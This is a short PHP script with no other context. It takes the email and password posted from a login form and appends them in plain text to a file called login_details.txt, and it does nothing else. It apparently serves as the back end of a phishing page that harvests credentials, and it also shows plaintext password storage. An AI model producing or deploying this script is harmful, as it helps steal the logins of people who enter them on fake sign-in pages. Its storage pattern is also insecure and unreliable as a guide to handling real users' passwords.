<?php
// Get the username and password from the form
$email = $_POST['email'];
$password = $_POST['password'];

// Open the file for appending
$file = fopen("login_details.txt", "a");

// Write the username and password to the file
fwrite($file, "Username: ".$email." Password: ".$password."\n");

// Close the file
fclose($file);
?>
